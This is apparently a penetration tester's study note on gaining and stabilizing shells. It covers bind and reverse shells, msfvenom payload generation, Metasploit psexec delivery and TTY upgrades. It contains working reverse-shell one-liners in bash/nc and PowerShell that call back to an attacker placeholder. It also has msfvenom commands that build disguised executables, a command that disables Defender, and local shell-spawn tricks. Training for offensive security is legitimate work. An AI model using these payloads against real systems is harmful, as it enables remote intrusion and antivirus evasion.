# Shells & Payloads

> Status: 🟨 In progress (sections 1–8 of 17 filled)
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Get and stabilize command execution: shell types, generating payloads, catching the connection, and upgrading to a usable TTY.

## Shell types
- **Reverse** — target connects back to my listener (best through firewalls/NAT). Catch with `nc -lvnp <port>` or `socat`.
- **Bind** — target listens, I connect in (needs the port reachable).
- **Web shell** — a script on the web server I drive via the browser.

## Concepts (source notes)
**Shell** = a program giving a text interface to the OS (Bash, Zsh, cmd, PowerShell). For us, "getting a shell" = exploiting a vuln to gain interactive command access on a target. CLI access is stealthier, faster and more automatable than a graphical shell (VNC/RDP), and it's the launch point for enumeration, privesc, pivoting, file transfer, persistence and exfil.

**Three perspectives on a shell:**
| Perspective | Meaning |
|---|---|
| Computing | The text userland env to run commands (Bash, Zsh, cmd, PowerShell) |
| Exploitation & Security | Interactive access gained by exploiting a vuln (e.g. EternalBlue → cmd on Windows) |
| Web | A web shell — a script (often uploaded) driven from the browser to run commands on the host |

**Payload** (security sense) = code crafted to exploit a vuln / deliver the shell (a broad term that also covers malware types like ransomware).

**Anatomy — terminal emulator + command interpreter:** a CLI = OS + terminal emulator (Windows Terminal, cmder, PuTTY, kitty, Alacritty, xterm, GNOME/MATE Terminal, Konsole, iTerm2) + the command-language interpreter (the shell). The interpreter you land in dictates which commands/scripts work.
```bash
ps            # see the running shell (e.g. bash) — "Command and Scripting Interpreter" in MITRE ATT&CK
env           # SHELL=/bin/bash tells you the interpreter
cat /etc/shells   # shells available on the box
```
The `$` prompt signals Bash/Ksh/POSIX-style shells. A terminal emulator isn't tied to one language — the shell can be swapped to preference.

## Bind shells
Target runs a **listener**; attacker connects **in**. Harder in the real world: needs a listener already running, and inbound is usually blocked by NAT/PAT and host/network firewalls — you often must already be on the internal network.
```bash
# server (target) — a raw netcat session first (not a real shell, just text pipe):
nc -lvnp 7777
# client (attacker) connects in:
nc -nv <target_ip> 7777
# server (target) — bind an actual bash shell to the session (this is the payload, delivered manually):
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <target_ip> 7777 > /tmp/f
# client connects in → you land in the target's shell
nc -nv <target_ip> 7777
```
Bind shells are **easier to defend** — the inbound connection is more likely to be caught/blocked by firewalls even on standard ports.

## Reverse shells
Attacker runs the **listener**; target connects **back out**. Preferred in real engagements — admins overlook outbound, better chance of staying undetected. Triggered via a vuln (unrestricted upload, command injection, etc.); the attack box becomes the server.
```bash
# attacker listener — bind to a common port (443) so outbound isn't blocked:
sudo nc -lvnp 443
```
```powershell
# Windows target — standard PowerShell reverse-shell one-liner (shellcode/payload):
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
- **Port 443** is rarely blocked outbound (looks like HTTPS) — but L7/deep-packet-inspection firewalls can still spot a reverse shell by inspecting contents.
- **Living off the land:** prefer tools native to the target. Netcat isn't native to Windows (would need the binary transferred) — PowerShell is, so use it there.
- **AV will catch it:** Defender blocks the one-liner ("ScriptContainedMaliciousContent"). In the lab you can disable real-time protection from an admin PowerShell: `Set-MpPreference -DisableRealtimeMonitoring $true` (evasion proper is its own topic). On success the listener shows the connection and a `PS` prompt.
- Don't reinvent payloads — **revshells.com** and PayloadsAllTheThings/Reverse-Shell-Cheat-Sheet have one-liners for every language (admins know these repos too, so sometimes customise).

## Payload generation (msfvenom)
Generate per-target payloads (set LHOST/LPORT; reverse-shell bodies not stored here):
```text
msfvenom -p linux/x64/shell_reverse_tcp   LHOST=<me> LPORT=<p> -f elf   > x.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<me> LPORT=<p> -f exe   > x.exe
msfvenom -p java/jsp_shell_reverse_tcp    LHOST=<me> LPORT=<p> -f war   > x.war   # Tomcat
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<me> LPORT=<p> -f asp > x.asp
```
Catch with `multi/handler` (meterpreter) or `nc`/`socat`. One-liner reverse shells (bash/powershell/python): generate from **revshells.com** rather than storing them here.

## Understanding the one-liners (source notes)
Worth knowing *what* a payload does (helps when AV blocks it and you need to change something).
- **Bash/nc reverse one-liner** `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ip> <port> > /tmp/f`: `rm -f` clears the FIFO → `mkfifo` makes a named pipe → `cat /tmp/f |` feeds the pipe's output into → `/bin/bash -i 2>&1 |` an interactive shell with stderr+stdout merged → `nc <ip> <port> > /tmp/f` sends it to the listener and loops the response back into the pipe.
- **PowerShell reverse one-liner**: `powershell -nop -c` = no profile, run this block → `New-Object System.Net.Sockets.TCPClient(ip,port)` opens the socket → `GetStream()` the channel → a `while` loop `Read`s bytes → `iex $data` runs what's received → prepends `PS <pwd>>` → writes the ASCII result back → `$client.Close()` on exit. Can also live as a `.ps1` (e.g. **nishang `Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port 4444`**, or `-Bind -Port 4444`).

## Metasploit delivery (automated payloads)
Full MSF reference is in [module 09](../09-metasploit/); for shells the flow is:
```text
sudo msfconsole
search smb                         # find modules for the enumerated service (e.g. from nmap -sC -sV)
use 56                             # e.g. exploit/windows/smb/psexec  (defaults payload windows/meterpreter/reverse_tcp)
options                            # see RHOSTS/SMBUser/SMBPass/SHARE + payload LHOST/LPORT
set RHOSTS <target> ; set SMBUser <u> ; set SMBPass <p> ; set SHARE ADMIN$ ; set LHOST <me>
exploit                            # → Meterpreter session
```
Module name reads `type/platform/service/tool` (e.g. `exploit/windows/smb/psexec`). **Meterpreter** = payload using in-memory DLL injection (stealthy C2): upload/download, run commands, keylog, manage services/processes. `?` lists commands; `shell` drops to a native system shell.

## MSFvenom — crafting standalone payloads
For when there's no direct network exploit path — craft a file and deliver it (email, download link, USB, or combined with an exploit module). MSFvenom can also encode/encrypt to dodge AV signatures.
```bash
msfvenom -l payloads                # list all ~592 payloads
# Linux stageless reverse shell → ELF:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<me> LPORT=443 -f elf > createbackup.elf
# Windows stageless reverse shell → EXE:
msfvenom -p windows/shell_reverse_tcp LHOST=<me> LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```
Flag breakdown: `-p` payload (OS/arch/type), `LHOST`/`LPORT` call-back target, `-f` output format, `>` output file (name it something inconspicuous). Catch with `sudo nc -lvnp 443` (or `multi/handler` for meterpreter). Unencoded `.exe` will almost certainly be caught by Defender.

**Staged vs stageless** (tell from the name — `/` separators = stages):
| | Example | Behaviour |
|---|---|---|
| **Staged** | `linux/x86/shell/reverse_tcp`, `windows/meterpreter/reverse_tcp` | sends a small stage first, which calls back to download the rest → runs shellcode. Smaller initial footprint but needs a stable connection. |
| **Stageless** | `linux/zarch/meterpreter_reverse_tcp`, `windows/meterpreter_reverse_tcp` | whole payload sent at once. Better on low-bandwidth/high-latency links and often better for evasion (less traffic). |

## Upgrade to a full TTY (do this immediately)
A raw `nc` shell has no tab-complete, no arrows, no `sudo`. Upgrade:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'   # step 1
# Ctrl+Z
stty raw -echo; fg                                 # step 2 (back in the shell)
export TERM=xterm                                  # step 3
```
Or use `socat` both ends for a full PTY from the start.

**Finishing touches after the upgrade:**
```bash
stty rows 38 columns 116      # match your terminal size (fixes vim/less formatting)
# get your real size first with `stty size` in your own terminal
```
If python isn't available, fallbacks: `script /dev/null -c bash` (or just `script -qc /bin/bash /dev/null`), `/bin/sh -i`, or spawn via perl/ruby/lua/awk (see local spawning below). `cat /etc/shells` shows what shells exist on the box.

## Local shell spawning (from a limited exec / SUID — GTFOBins)
```bash
/bin/sh -i ; python3 -c 'import pty;pty.spawn("/bin/sh")'
awk 'BEGIN{system("/bin/sh")}' ; perl -e 'exec "/bin/sh";'
find . -exec /bin/sh \; -quit ; vim -c ':!/bin/sh'
```

## Fix / defense
EGRESS filtering (block outbound to random ports/IPs) kills most reverse shells; app allow-listing; EDR on payload signatures; least privilege.

> First move after catching a reverse shell: **upgrade the TTY** (python pty → `stty raw -echo; fg` → `export TERM=xterm`) so you get tab-complete, arrows, and `sudo`. A raw shell will bite you otherwise.
